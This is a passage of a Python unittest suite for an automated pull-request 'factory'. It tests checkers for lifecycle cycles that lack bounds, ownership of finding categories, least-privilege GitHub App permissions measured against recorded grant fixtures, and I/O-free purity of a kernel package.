                self.assertTrue(caught(problems, "%s -> new by stranger names the bound %s; what a stranger starts"
                                                 " only a person ends" % (start, bound)), problems)

    def test_an_undeclared_person_only_state_is_caught(self):
        lc = dict(check_lifecycle.load(), person_only_exits=["limbo"])
        problems = check_lifecycle.check(lc)
        self.assertTrue(caught(problems, "person_only_exits names an undeclared state: limbo"), problems)

    def test_malformed_lifecycle_data_is_reported_not_raised(self):
        pr = check_lifecycle.load()
        pr["transitions"][0].pop("by")
        problems = check_lifecycle.run(clone({"lifecycle/issue.json": "[]", "lifecycle/pull_request.json": json.dumps(pr)}))
        self.assertTrue(caught(problems, "lifecycle/issue.json does not match the Lifecycle schema"), problems)
        self.assertTrue(caught(problems, "lifecycle/pull_request.json does not match the Lifecycle schema"), problems)
        self.assertTrue(check_lifecycle.check({"states": "x"}))
        self.assertTrue(caught(check_lifecycle.run(clone({"config/defaults.json": "[]"})), "config/defaults.json"))
        self.assertTrue(caught(check_lifecycle.run(clone({"schemas/lifecycle.schema.json": "[]"})),
                               "schemas/lifecycle.schema.json"))

    def test_a_state_nothing_declares_or_reaches_or_times_is_caught(self):
        lc = copy.deepcopy(check_lifecycle.load())
        lc["states"].append("limbo")
        lc["transitions"].append({"from": "merged", "to": "nowhere", "by": "human", "bound": None})
        problems = check_lifecycle.check(lc)
        for words in ("state can never be reached: limbo", "no staleness limit for: limbo",
                      "a terminal state has a way out: merged", "an undeclared state: nowhere"):
            self.assertTrue(caught(problems, words), words)

    def test_an_issue_retried_with_no_bound_is_caught(self):
        # I-14. The cycle that failed the issue Lifecycle's first drawing: `ready` to `in_progress`
        # and back, when an opening Run ends having opened nothing.
        lc = check_lifecycle.load("issue")
        self.assertEqual(check_lifecycle.check(lc), [])
        self.assertIn(("in_progress", "ready", "factory", "max_attempts"),
                      {(tr["from"], tr["to"], tr["by"], tr["bound"]) for tr in lc["transitions"]})
        self.assertIn("a cycle with no person in it has no bound: ready -> in_progress -> ready",
                      check_lifecycle.check(unbound(lc, "max_attempts")))

    def test_an_issue_retried_after_every_unmerged_close_is_caught(self):
        # I-43. `in_progress` or `in_review` back to `ready`, when a linked pull request closes unmerged.
        lc = check_lifecycle.load("issue")
        self.assertTrue(caught(check_lifecycle.check(unbound(lc, "max_unmerged_closes")),
                               "a cycle with no person in it has no bound"))

    def test_verify_checks_the_issue_lifecycle_too(self):
        lc = unbound(check_lifecycle.load("issue"), "max_attempts")
        problems = check_lifecycle.run(clone({"lifecycle/issue.json": json.dumps(lc)}))
        self.assertTrue(caught(problems, "lifecycle/issue.json: a cycle with no person in it"), problems)
        self.assertFalse(caught(problems, "lifecycle/pull_request.json"), problems)

    def test_a_work_item_with_no_lifecycle_is_caught(self):
        root = clone({"lifecycle/issues.json": (ROOT / "lifecycle" / "issue.json").read_text()})
        (root / "lifecycle" / "issue.json").unlink()
        problems = check_lifecycle.run(root)
        self.assertTrue(caught(problems, "no Lifecycle for the Work item issue"), problems)
        self.assertTrue(caught(problems, "lifecycle/issues.json declares the Work item issue"), problems)

    def test_a_bound_that_is_not_a_limit_is_caught(self):
        config = json.loads((ROOT / "config" / "defaults.json").read_text())
        del config["limits"]["max_unmerged_closes"]
        problems = check_lifecycle.run(clone({"config/defaults.json": json.dumps(config)}))
        self.assertTrue(caught(problems, "lifecycle/issue.json: the bound max_unmerged_closes is not a limit"),
                        problems)

    def test_the_act_ceiling_can_bound_a_transition(self):
        # An enqueue is an act, not a Run; a cycle through the merge queue is bounded by the act ceiling.
        lc = copy.deepcopy(check_lifecycle.load())
        for tr in lc["transitions"]:
            if (tr["from"], tr["to"]) == ("converged", "queued"):
                tr["bound"] = "max_acts_per_item"
        config = json.loads((ROOT / "config" / "defaults.json").read_text())
        self.assertEqual(check_lifecycle.check(lc, config["limits"]), [])
        del config["limits"]["max_acts_per_item"]
        self.assertTrue(caught(check_lifecycle.check(lc, config["limits"]), "the bound max_acts_per_item is not a limit"))

    def test_a_cycle_through_a_lens_with_no_bound_is_caught(self):
        # L-04 and I-14 hold for any cycle with no person in it, not only one the Factory makes alone.
        # A Lens that flipped `converged` and `addressing` on unchanged content would go round for ever.
        limits = json.loads((ROOT / "config" / "defaults.json").read_text())["limits"]
        self.assertEqual(check_lifecycle.check(check_lifecycle.load(), limits), [])
        lc = copy.deepcopy(check_lifecycle.load())
        for tr in lc["transitions"]:
            if (tr["from"], tr["to"]) == ("addressing", "converged"):
                tr["by"] = "lens"
        self.assertIn("a cycle with no person in it has no bound: addressing -> converged -> addressing",
                      check_lifecycle.check(lc, limits))

    def test_a_cycle_through_the_platform_with_no_bound_is_caught(self):
        # A merge queue that ejects every time, and an enqueue made again each time it does.
        lc = check_lifecycle.load()
        lc["transitions"] = [dict(tr, bound=None) if (tr["from"], tr["to"]) == ("converged", "queued") else tr
                             for tr in lc["transitions"]]
        problems = check_lifecycle.check(lc)
        self.assertTrue(any(p.startswith("a cycle with no person in it has no bound: ") and "converged -> queued" in p
                            for p in problems), problems)
        problems = check_lifecycle.run(clone({"lifecycle/pull_request.json": json.dumps(lc)}))
        self.assertTrue(caught(problems, "lifecycle/pull_request.json: a cycle with no person in it"), problems)

    def test_a_hold_only_a_person_ends_is_bound_by_a_person_and_nothing_else_is(self):
        # A Hold an App places has no ceiling behind it, and stands until a person removes it.
        lc = check_lifecycle.load()
        self.assertIn(("verifying", "held", "platform", check_lifecycle.PERSON),
                      {(tr["from"], tr["to"], tr["by"], tr["bound"]) for tr in lc["transitions"]})
        limits = json.loads((ROOT / "config" / "defaults.json").read_text())["limits"]
        self.assertEqual(check_lifecycle.check(lc, limits), [])
        for tr in ({"from": "verifying", "to": "addressing", "by": "lens", "bound": check_lifecycle.PERSON},
                   {"from": "verifying", "to": "held", "by": "human", "bound": check_lifecycle.PERSON}):
            problems = check_lifecycle.check(dict(lc, transitions=lc["transitions"] + [tr]), limits)
            self.assertTrue(caught(problems, "the bound person is only for a Hold that no person makes"), tr)
        # Without it, the platform's way out of a Hold on the content closes a cycle with no person in it.
        self.assertTrue(caught(check_lifecycle.check(unbound(lc, check_lifecycle.PERSON)),
                               "a cycle with no person in it has no bound"))

    def test_a_bound_the_kernel_does_not_count_for_each_item_is_caught(self):
        # A limit on size or on the whole org stops nothing going round on one item.
        for limit in ("max_diff_lines", "org_max_active_runs"):
            lc = check_lifecycle.load()
            for tr in lc["transitions"]:
                if (tr["from"], tr["to"]) == ("converged", "queued"):
                    tr["bound"] = limit
            words = "the bound %s is not a limit the Kernel counts for each item" % limit
            self.assertTrue(caught(check_lifecycle.check(lc), words), limit)
            problems = check_lifecycle.run(clone({"lifecycle/pull_request.json": json.dumps(lc)}))
            self.assertTrue(caught(problems, "lifecycle/pull_request.json: " + words), problems)

    def test_a_pull_request_not_served_can_be_served_again_but_not_by_a_loop(self):
        # A stacked pull request is not served until GitHub retargets it, so `not_served` is not terminal.
        lc = check_lifecycle.load()
        self.assertNotIn("not_served", lc["terminal"])
        self.assertEqual(lc["stale_after_minutes"]["not_served"], 1440)
        exits = {(tr["to"], tr["by"]) for tr in lc["transitions"] if tr["from"] == "not_served"}
        self.assertLessEqual({("verifying", "platform"), ("draft", "platform"), ("closed", "human")}, exits)
        self.assertEqual(check_lifecycle.check(lc), [])
        lc["transitions"].append({"from": "verifying", "to": "not_served", "by": "platform", "bound": None})
        self.assertIn("a cycle with no person in it has no bound: verifying -> not_served -> verifying",
                      check_lifecycle.check(lc))


class Authority(unittest.TestCase):
    def setUp(self):
        self.table = json.loads((ROOT / "config" / "authority.json").read_text())

    def test_security_may_never_be_declined(self):
        self.table["categories"]["security"]["may_accept"].append("declined")
        self.assertTrue(caught(check_authority.run(self.table), "security"))

    def test_the_author_may_not_own_a_category(self):
        self.table["categories"]["functional"]["owner"] = "dev-lead"
        self.assertTrue(caught(check_authority.run(self.table), "author Role"))

    def test_a_value_held_twice_must_agree(self):
        self.table["max_rounds"] = 9
        self.assertTrue(caught(check_authority.run(self.table), "max_rounds differs"))

    def test_a_category_nobody_owns_is_caught(self):
        del self.table["categories"]["human"]
        self.table["categories"]["performance"] = {"owner": "pr-review", "may_accept": ["fixed"]}
        problems = check_authority.run(self.table)
        self.assertTrue(caught(problems, "category human, and nobody owns it"))
        self.assertTrue(caught(problems, "performance has an owner, and no Finding can carry it"))

    def test_a_thread_carries_the_categories_a_finding_does(self):
        facts = json.loads((ROOT / "schemas" / "facts.schema.json").read_text())
        enum = facts["properties"]["threads"]["items"]["properties"]["category"]["enum"]
        enum.remove("security")
        enum.append("style")
        problems = check_authority.run(self.table, facts=facts)
        self.assertTrue(caught(problems, "a thread may carry the category style, and no Finding can"))
        self.assertTrue(caught(problems, "a Finding may carry the category security, and no thread can"))
        # A schema with no category on a thread is a problem reported, not one raised.
        del facts["properties"]["threads"]["items"]["properties"]["category"]
        self.assertTrue(caught(check_authority.run(self.table, facts=facts), "a thread in the facts carries no category"))

    def test_a_raised_finding_with_a_category_nobody_owns_is_caught(self):  # decision 0038
        result = json.loads((ROOT / "schemas" / "result.schema.json").read_text())
        raised = result["$defs"]["raised"]["properties"]
        raised["category"]["enum"].remove("security")
        raised["category"]["enum"].append("style")
        raised["severity"]["enum"].append("trivial")
        problems = check_authority.run(self.table, result=result)
        self.assertTrue(caught(problems, "a raised Finding may carry the category style, and no Finding record can"))
        self.assertTrue(caught(problems, "a Finding record may carry the category security, and no raised Finding can"))
        self.assertTrue(caught(problems, "a raised Finding may carry the severity trivial, and no Finding record can"))
        del raised["category"]["enum"]
        del raised["severity"]
        problems = check_authority.run(self.table, result=result)
        self.assertTrue(caught(problems, "a raised Finding in a Result carries no category"))
        self.assertTrue(caught(problems, "a raised Finding in a Result carries no severity"))

    def test_a_manifest_with_a_category_nobody_owns_is_caught(self):  # decision 0039
        role = json.loads((ROOT / "schemas" / "role.schema.json").read_text())
        role["properties"]["owns"]["items"]["enum"].append("style")
        role["properties"]["lens"]["properties"]["raises"]["items"]["enum"].remove("security")
        problems = check_authority.run(self.table, role=role)
        self.assertTrue(caught(problems, "a Role manifest may own the category style, and no Finding can carry it"))
        self.assertTrue(caught(problems, "a Finding may carry the category security, and no Role manifest can raise it"))
        del role["properties"]["shadows"]
        self.assertTrue(caught(check_authority.run(self.table, role=role), "a Role manifest's shadows names no category"))

    def test_the_kernel_reads_the_categories_and_severities_a_finding_carries(self):
        for name, value in (("CATEGORIES", terms.CATEGORIES[1:]), ("SEVERITIES", terms.SEVERITIES + ("critical",))):
            with mock.patch.object(terms, name, value):
                self.assertTrue(caught(check_authority.run(self.table), "the Kernel reads the"), name)

    def test_the_status_on_the_item_never_carries_a_required_lens_name(self):
        # The Controller posts the status on the item as a check run under one fixed name. Under a required Lens's
        # name it would speak for that Lens: a deterministic Lens's check, or a model Lens's.
        config = json.loads((ROOT / "config" / "defaults.json").read_text())
        self.assertEqual(check_authority.run(self.table, config), [])
        required = config["required_lenses"]
        names = [lens[key] for lens in required["deterministic"] for key in ("lens", "check")] + required["model"]
        # A Lens's name or its check's, in any case and with any space around it: a reader of names may fold either.
        for name in names + [n.upper() for n in names] + [" %s\t" % n for n in names]:
            problems = check_authority.run(self.table, dict(config, status_on_item=name))
            self.assertTrue(caught(problems, "the status on the item is named %r, a required Lens's" % name), name)

    def test_a_lens_or_a_check_named_twice_is_refused(self):
        # Two entries for one Lens, or for one check, could each pin another App: which one reads the Lens is unclear.
        config = json.loads((ROOT / "config" / "defaults.json").read_text())
        lenses = config["required_lenses"]["deterministic"]
        for twice in (dict(lenses[0], app_id=1000001), dict(lenses[1], lens=lenses[0]["lens"].upper()),
                      dict(lenses[1], lens="another", check=" %s " % lenses[0]["check"])):
            config["required_lenses"]["deterministic"] = lenses + [twice]
            self.assertTrue(caught(check_authority.run(self.table, config), "is named twice"), twice)
        config["required_lenses"]["deterministic"] = lenses
        # So is a model Lens named twice, or one that shares a deterministic Lens's name.
        model = config["required_lenses"]["model"]
        for twice in (model + [model[0]], model + [" %s" % lenses[0]["lens"].upper()]):
            config["required_lenses"]["model"] = twice
            self.assertTrue(caught(check_authority.run(self.table, config), "is named twice"), twice)
        # The other side: each named once.
        config["required_lenses"]["model"] = model
        self.assertEqual(check_authority.run(self.table, config), [])

    def test_a_category_a_model_judges_needs_a_role_and_no_role_shadows_itself(self):
        self.table["categories"]["functional"]["owner"] = "human"
        self.table["categories"]["security"]["shadow"] = "pr-review"
        problems = check_authority.run(self.table)
        self.assertTrue(caught(problems, "needs a Role as owner") and caught(problems, "cannot shadow itself"))


class Apps(unittest.TestCase):
    def setUp(self):
        self.table = json.loads((ROOT / "config" / "apps.json").read_text())
        self.apps, self.needs = self.table["apps"], self.table["needs"]
        self.fixture = json.loads((ROOT / "trials" / "P-39.grants.json").read_text())
        self.reach = json.loads((ROOT / "trials" / "P-39.reach.json").read_text())
        installations = [e for e in self.fixture["exchanges"] if e["request"]["call"] == check_apps.INSTALLATIONS]
        self.listed = installations[0]["response"]["body"]["installations"]
        self.installed = {i["app_slug"]: i for i in self.listed}
        self.registered = {e["response"]["body"]["slug"]: e["response"]["body"] for e in self.fixture["exchanges"]
                           if e["request"]["call"].startswith(check_apps.REGISTRATION)}
        self.reached = {e["request"]["as"]["name"]: e["response"]["body"] for e in self.reach["exchanges"]}

    def check(self, **leave_out) -> list:
        facts = (ROOT / "schemas" / "facts.schema.json").read_text()
        files = {"config/apps.json": json.dumps(self.table), "schemas/facts.schema.json": facts,
                 "trials/P-39.grants.json": json.dumps(self.fixture), "trials/P-39.reach.json": json.dumps(self.reach)}
        return check_apps.run(tree({rel: text for rel, text in files.items() if rel not in leave_out.get("files", ())}))

    def test_the_data_is_held_to_what_github_granted_each_app(self):
        # P-39 recorded each installation's permissions. The data must name exactly those, at the same levels: a
        # permission GitHub granted that the data leaves out, one the data names that was not granted, and a level
        # that differs are each caught, and so is an app_id whose installation is another App's, or none.
        self.assertEqual(self.check(), [])
        self.installed["combsmith-sf-controller"]["permissions"]["issues"] = "read"
        self.installed["combsmith-sf-reader"]["permissions"].pop("checks")
        self.apps["pr-review"]["permissions"]["contents"]["level"] = "write"
        problems = self.check()
        self.assertTrue(caught(problems, "controller: issues is absent in the data and read as GitHub granted it"))
        self.assertTrue(caught(problems, "reader: checks is read in the data and absent as GitHub granted it"))
        self.assertTrue(caught(problems, "pr-review: contents is write in the data and read as GitHub granted it"))
        self.setUp()
        self.apps["controller"]["app_id"] = self.apps["reader"]["app_id"]
        self.apps["reader"]["app_id"] = 1
        problems = self.check()
        self.assertTrue(caught(problems, "controller: App 5364151 is installed as combsmith-sf-reader"))
        self.assertTrue(caught(problems, "reader: trials/P-39.grants.json records no installation of App 1"))

    def test_an_installation_with_events_or_on_every_repo_is_caught(self):
        # Decision 0035: P-39 passes only if each installation receives no event and is on selected repos.
        self.installed["combsmith-sf-controller"]["events"] = ["push"]
        self.installed["combsmith-sf-reader"]["repository_selection"] = "all"
        problems = self.check()
        self.assertTrue(caught(problems, "controller: its installation in trials/P-39.grants.json receives the "
                                         "events ['push']"))
        self.assertTrue(caught(problems, "reader: its installation in trials/P-39.grants.json has the selection all"))
        self.assertFalse(caught(problems, "pr-review:"))

    def test_the_registration_is_held_to_the_data_as_the_installation_is(self):
        # What the App is registered with is what a new installation accepts, so it too is held to the data.
        self.registered["combsmith-sf-controller"]["permissions"]["contents"] = "write"
        self.registered["combsmith-sf-reader"]["events"] = ["pull_request"]
        self.registered["combsmith-sf-pr-review"]["id"] = 1
        problems = self.check()
        self.assertTrue(caught(problems, "controller: contents is read in the data and write as the App is "
                                         "registered in trials/P-39.grants.json"))
        self.assertTrue(caught(problems, "reader: the App is registered in trials/P-39.grants.json for the events "
                                         "['pull_request']"))
        self.assertTrue(caught(problems, "pr-review: combsmith-sf-pr-review is registered as App 1"))
        self.setUp()
        self.fixture["exchanges"] = [e for e in self.fixture["exchanges"]
                                     if e["request"]["call"] != "GET /apps/combsmith-sf-reader"]
        problems = self.check()
        self.assertTrue(caught(problems, "reader: no fixture of trial P-39 records GET /apps/combsmith-sf-reader"))
        self.assertFalse(caught(problems, "controller: no fixture"))

    def test_a_fixture_of_p39_that_failed_is_not_trusted(self):
        # Only a passing fixture is kept, and no App's key is stored until P-39 passes.
        self.fixture["verdict"] = "fail"
        self.reach["verdict"] = "fail"
        problems = self.check()
        self.assertTrue(caught(problems, "trials/P-39.grants.json: its verdict is fail"))
        self.assertTrue(caught(problems, "trials/P-39.reach.json: its verdict is fail"))

    def test_the_repos_each_installation_reaches_are_exactly_installed_on(self):
        # P-39's reach fixture is held to installed_on, and without it which repos an App reaches is unread.
        self.reached["combsmith-sf-controller"]["repository_selection"] = "all"
        self.reached["combsmith-sf-controller"]["repositories"] = []
        self.reached["combsmith-sf-controller"]["total_count"] = 0
        self.apps["reader"]["installed_on"] = self.apps["reader"]["installed_on"][:1]
        problems = self.check()
        self.assertTrue(caught(problems, "controller: its installation reaches repos by the selection all in "
                                         "trials/P-39.reach.json"))
        self.assertTrue(caught(problems, "controller: its installation reaches no repo in trials/P-39.reach.json"))
        self.assertTrue(caught(problems, "reader: its installation reaches combsmith/software-factory, combsmith/%s in "
                                         "trials/P-39.reach.json, and installed_on names combsmith/software-factory;"
                                         % check_trials.CANARY))
        self.setUp()
        problems = self.check(files=("trials/P-39.reach.json",))
        for app in ("controller", "pr-review", "reader"):
            self.assertTrue(caught(problems, "%s: no fixture of trial P-39 records GET /installation/repositories read "
                                             "as combsmith-sf-%s" % (app, app)))

    def test_a_read_github_refused_is_not_trusted(self):
        # A read answered with anything but 200 holds nothing GitHub granted, even when its body matches the data.
        exchange = [e for e in self.fixture["exchanges"] if e["request"]["call"] == check_apps.INSTALLATIONS][0]
        exchange["response"]["status"] = 403
        self.reach["exchanges"][0]["response"]["status"] = 401
        problems = self.check()
        self.assertTrue(caught(problems, "trials/P-39.grants.json: its read GET /orgs/combsmith/installations was "
                                         "answered 403, not 200"))
        self.assertTrue(caught(problems, "trials/P-39.reach.json: its read GET /installation/repositories?per_page=100 "
                                         "was answered 401, not 200"))
        self.assertTrue(caught(problems, "controller: no fixture of trial P-39 records GET /installation/repositories"))

    def test_an_app_listed_twice_among_the_installations_is_caught(self):
        # A record that lists one App twice cannot be trusted, whichever copy agrees with the data.
        twin = json.loads(json.dumps(self.installed["combsmith-sf-controller"]))
        twin["permissions"]["contents"] = "write"
        self.listed.insert(0, twin)
        self.fixture["exchanges"][3]["response"]["body"]["total_count"] += 1
        problems = self.check()
        self.assertTrue(caught(problems, "trials/P-39.grants.json: its read GET /orgs/combsmith/installations lists "
                                         "App 5364130 more than once"))
        self.assertTrue(caught(problems, "no fixture of trial P-39 in trials/ records GET /orgs/combsmith/installations"))

    def test_a_list_not_read_whole_is_not_trusted(self):
        # One page of more, a count the list falls short of, or one repo listed twice, is not the whole of what an
        # installation reaches, nor of the org's installations.
        self.reach["exchanges"][0]["response"]["headers"]["link"] = '<https://api.github.com/x?page=2>; rel="next"'
        self.reached["combsmith-sf-pr-review"]["total_count"] = 3
        repos = self.reached["combsmith-sf-reader"]["repositories"]
        repos[1] = json.loads(json.dumps(repos[0]))
        self.fixture["exchanges"][3]["response"]["body"]["total_count"] = 18
        problems = self.check()
        call = "its read GET /installation/repositories?per_page=100"
        self.assertTrue(caught(problems, "trials/P-39.reach.json: %s has a link header, so it is one page of more"
                                         % call))
        self.assertTrue(caught(problems, "trials/P-39.reach.json: %s lists 2 of the 3 it counts" % call))
        self.assertTrue(caught(problems, "trials/P-39.reach.json: %s lists combsmith/software-factory more than once"
                                         % call))
        self.assertTrue(caught(problems, "trials/P-39.grants.json: its read GET /orgs/combsmith/installations lists "
                                         "17 of the 18 it counts"))
        for app in ("controller", "pr-review", "reader"):
            self.assertTrue(caught(problems, "%s: no fixture of trial P-39 records GET /installation/repositories"
                                             % app))

    def test_with_no_record_of_what_github_granted_the_data_is_not_trusted(self):
        facts = (ROOT / "schemas" / "facts.schema.json").read_text()
        problems = check_apps.run(tree({"config/apps.json": json.dumps(self.table), "schemas/facts.schema.json": facts}))
        self.assertTrue(caught(problems, "no fixture of trial P-39 in trials/ records GET /orgs/combsmith/installations"))
        self.fixture["exchanges"] = [e for e in self.fixture["exchanges"]
                                     if e["request"]["call"] != check_apps.INSTALLATIONS]
        self.assertTrue(caught(self.check(), "no fixture of trial P-39"))

    def test_each_apps_key_is_kept_in_the_environment_of_the_job_that_holds_it(self):
        # A job that names an environment reads every secret in it. With the Controller's and the reader's keys
        # swapped, run, which reads untrusted text, would hold the Controller's key, which writes check runs.
        apps = self.apps
        apps["controller"]["key"], apps["reader"]["key"] = apps["reader"]["key"], apps["controller"]["key"]
        self.apps["pr-review"]["key"]["secret"] = "REVIEW_APP_KEY"
        problems = self.check()
        self.assertTrue(caught(problems, "controller: its key is kept in factory-run, and the poller job holds it"))
        self.assertTrue(caught(problems, "reader: its key is kept in factory-poller, and the run job holds it"))
        self.assertTrue(caught(problems, "controller: its key is kept as READER_APP_KEY; name it CONTROLLER_APP_KEY"))
        self.assertTrue(caught(problems, "reader: its key is kept as CONTROLLER_APP_KEY; name it READER_APP_KEY"))
        self.assertTrue(caught(problems, "pr-review: its key is kept as REVIEW_APP_KEY; name it PR_REVIEW_APP_KEY"))
        self.assertFalse(caught(problems, "pr-review: its key is kept in"))
        self.setUp()
        del self.apps["pr-review"]["key"]
        self.assertTrue(caught(self.check(), "pr-review: names no environment its key is kept in"))

    def test_every_roles_key_is_kept_in_applys_environment_and_they_may_share_it(self):
        # apply holds each Role's App key (design §4.9), so a second Role's App shares its environment.
        self.apps["author"] = {"key": {"environment": "factory-apply", "secret": "AUTHOR_APP_KEY"}}
        self.assertEqual(check_apps._keys(self.apps), [])
        self.apps["author"]["key"]["environment"] = "factory-run"
        self.assertTrue(caught(check_apps._keys(self.apps), "author: its key is kept in factory-run, and the apply job"))

    def test_no_app_may_change_a_workflow_or_upload_to_code_scanning(self):
        # GitHub refuses an App's push under .github/workflows/ without `workflows`, and with `security_events: write`
        # an App could upload to code scanning under CodeQL's tool and category. No Factory App holds either, at any
        # level, whatever need it names.
        self.assertEqual(self.check(), [])
        for name in ("workflows", "security_events"):
            for level in ("read", "write"):
                self.setUp()
                self.apps["controller"]["permissions"][name] = {"level": level, "needs": ["read:facts.checks"]}
                said = "controller: holds %s; no Factory App may" % name
                self.assertTrue(caught(self.check(), said), (name, level))

    def test_a_permission_nothing_needs_is_caught(self):
        self.apps["controller"]["permissions"]["checks"]["needs"] = []
        del self.apps["reader"]["permissions"]["issues"]["needs"]
        problems = self.check()
        self.assertTrue(caught(problems, "controller: checks names no Effect, write or read that needs it"))
        self.assertTrue(caught(problems, "reader: issues names no Effect, write or read that needs it"))

    def test_the_reader_given_any_write_is_caught(self):
        self.apps["reader"]["permissions"]["contents"]["level"] = "write"
        self.apps["reader"]["permissions"]["pull_requests"]["needs"].append("effect:comment")
        problems = self.check()
        self.assertTrue(caught(problems, "reader: contents is write; the reader App writes nothing"))
        self.assertTrue(caught(problems, "reader: pull_requests serves effect:comment; the reader App writes nothing"))

    def test_a_write_that_only_a_read_needs_is_caught(self):
        self.apps["pr-review"]["permissions"]["contents"]["level"] = "write"
        self.assertTrue(caught(self.check(), "pr-review: contents is write and only a read needs it"))

    def test_a_need_served_by_another_permission_or_level_is_caught(self):
        self.apps["controller"]["permissions"]["contents"]["needs"].append("read:facts.reviews")
        self.apps["controller"]["permissions"]["pull_requests"]["needs"].append("effect:comment")
        problems = self.check()
        self.assertTrue(caught(problems, "controller: contents serves read:facts.reviews, which the table maps to "
                                         "pull_requests"))
        self.assertTrue(caught(problems, "controller: pull_requests is read and serves effect:comment, which the "
                                         "table maps to pull_requests write"))

    def test_a_grant_for_a_need_that_is_waiting_is_caught(self):
        self.apps["controller"]["permissions"]["pull_requests"]["needs"].append("read:facts.queue")
        self.assertTrue(caught(self.check(), "controller: pull_requests serves read:facts.queue, which waits on issue 185"))

    def test_a_write_need_held_by_two_apps_is_caught(self):
        self.apps["controller"]["permissions"]["pull_requests"] = {"level": "write", "needs": ["effect:comment"]}
        self.assertTrue(caught(self.check(), "effect:comment is held by controller and pr-review"))

    def test_a_need_with_no_mapping_and_no_wait_is_caught(self):
        self.needs["read:facts.reviews"] = {}
        self.needs["read:facts.threads"] = {"permission": "pull_requests", "level": "read", "waits_on": "trial P-2"}
        del self.needs["read:facts.item"]
        problems = self.check()
        self.assertTrue(caught(problems, "read:facts.reviews maps to no permission and waits on nothing"))
        self.assertTrue(caught(problems, "read:facts.threads both maps to a permission and waits"))
        self.assertTrue(caught(problems, "controller: metadata serves read:facts.item, which is not in the table of needs"))

    def test_a_read_of_a_fact_that_does_not_exist_is_caught(self):
        self.needs["read:facts.title"] = {"permission": "pull_requests", "level": "read"}
        self.assertTrue(caught(self.check(), "read:facts.title reads a field facts/1 does not have"))

    def test_an_app_installed_across_the_org_is_caught(self):
        self.apps["controller"]["installed_on"] = "all"
        self.apps["reader"]["installed_on"] = ["combsmith"]
        problems = self.check()
        self.assertTrue(caught(problems, "controller: installed_on is not a list of named repos"))
        self.assertTrue(caught(problems, "reader: installed_on is not a list of named repos"))

    def test_a_repo_named_twice_is_caught(self):
        self.apps["reader"]["installed_on"].append(self.apps["reader"]["installed_on"][0])
        self.assertTrue(caught(self.check(), "reader: combsmith/software-factory is named twice in installed_on"))

    def test_an_app_named_for_another_key_is_caught(self):
        self.apps["controller"]["name"] = "combsmith-sf-reader"
        self.assertTrue(caught(self.check(), "controller: the App is named combsmith-sf-reader; name it "
                                             "combsmith-sf-controller"))

    def test_a_file_that_is_missing_or_cannot_be_read_is_a_problem_not_a_crash(self):
        self.assertTrue(caught(check_apps.run(tree({"x": ""})), "config/apps.json cannot be read"))
        self.assertTrue(caught(check_apps.run(tree({"config/apps.json": "{"})), "config/apps.json cannot be read"))
        self.assertTrue(caught(check_apps.run(tree({"config/apps.json": "{}"})), "names no Apps"))


class Purity(unittest.TestCase):
    def test_io_in_the_kernel_is_caught(self):
        root = tree({"kernel/x.py": "import os\n\ndef f():\n    return open('x')\n"})
        problems = check_purity.run(root)
        self.assertTrue(caught(problems, "imports os") and caught(problems, "uses open"))

    def test_io_in_a_package_below_the_kernel_is_caught(self):
        root = tree({"kernel/a.py": "from kernel.extra import clock\n", "kernel/extra/clock.py": "import time\n"})
        self.assertTrue(caught(check_purity.run(root), "extra/clock.py:1 imports time"))

    def test_a_limit_written_into_the_kernel_is_caught(self):
        root = tree({"kernel/x.py": "def f(runs):\n    return len(runs) >= 3 or runs[0] == 1\n"})
        self.assertEqual(len(check_purity.run(root)), 1)

    def test_only_the_calendar_may_write_a_number(self):
        # The calendar is nobody's choice, so it is the one place the Kernel writes a number but 0 and 1: in terms.py,
        # under its own name, with its own value. Any other number is a limit, and a limit is data.
        calendar = "MINUTES_PER_HOUR = 60\nLEAP_YEARS = (4, 100, 400)\nFEBRUARY = 2\n"
        self.assertEqual(check_purity.run(tree({"kernel/terms.py": calendar})), [])
        for rel, text in (("kernel/terms.py", "MINUTES_PER_HOUR = 61\n"), ("kernel/terms.py", "LEAP_YEARS = (4, 100, 401)\n"),
                          ("kernel/terms.py", "MINUTES_PER_HOUR = 60.0\n"), ("kernel/terms.py", "MAX_ATTEMPTS = 3\n"),
                          ("kernel/terms.py", "FEBRUARY = HOURS_PER_DAY = 2\n"), ("kernel/x.py", "MINUTES_PER_HOUR = 60\n"),
                          ("kernel/terms.py", "def f():\n    MINUTES_PER_HOUR = 60\n    return MINUTES_PER_HOUR\n")):
            self.assertTrue(caught(check_purity.run(tree({rel: text})), "writes the number"), (rel, text))
        # A unit is assigned once, so no second assignment can change it: not to 0, 1 or True, which are no number
        # the check refuses, and not from outside terms.py. What cannot be read as a value is a problem, not a crash.
        again = "SECONDS_PER_MINUTE = 60\nHOURS_PER_DAY = 24\n"
        for rel, text in (("kernel/terms.py", again + "SECONDS_PER_MINUTE = 1\n"),
                          ("kernel/terms.py", again + "HOURS_PER_DAY = True\n"),
                          ("kernel/terms.py", again + "HOURS_PER_DAY = 24\n"),
                          ("kernel/terms.py", "SECONDS_PER_MINUTE: int = 60\n"),
                          ("kernel/terms.py", "SECONDS_PER_MINUTE = {[]: 1}\n"),
                          ("kernel/terms.py", "SECONDS_PER_MINUTE, X = 60, 1\n"),
                          ("kernel/x.py", "from kernel import terms as t\n\ndef f():\n    t.SECONDS_PER_MINUTE = 1\n"),
                          ("kernel/x.py", "def f(n):\n    HOURS_PER_DAY = n\n    return HOURS_PER_DAY\n")):
            self.assertTrue(caught(check_purity.run(tree({"kernel/terms.py": again, rel: text})), "a unit of the calendar"),
                            (rel, text))
        self.assertEqual(check_purity.run(tree({"kernel/terms.py": again, "kernel/x.py": "def f(t):\n"
                                                "    return t.SECONDS_PER_MINUTE\n"})), [])

    def test_state_kept_between_calls_is_caught(self):
        root = tree({"kernel/x.py": "SEEN = {}\nKIND = 'held'\nNAMES = frozenset({'a'})\n"})
        self.assertEqual(check_purity.run(root), ["x.py:1 holds a value that can change; State is never stored"])
        hidden = {"a default": "def f(key, seen={}):\n    return seen\n",
                  "a class": "class Memo:\n    seen = {}\n",
                  "code at import": "if True:\n    SEEN = {}\n",
                  "a global": "def f():\n    global X\n    X = 1\n"}
        for name, text in hidden.items():
            self.assertTrue(check_purity.run(tree({"kernel/x.py": text})), name)

    def test_an_attribute_assigned_is_caught(self):
        # A module that assigns another's names changes what that module decides from outside it: the gate's
        # severities from derive.py, or a code from terms.py, at import or in a call.
        for text in ("from kernel import gate as _gate\n\n_gate.SECURITY = 'none'\n",
                     "from kernel import terms as t\nt.HELD = 'x'\n",
                     "from kernel import gate\n\n\ndef f():\n    gate.GATING_SEVERITIES = frozenset()\n",
                     "from kernel import terms as t\n\n\ndef f():\n    del t.HELD\n",
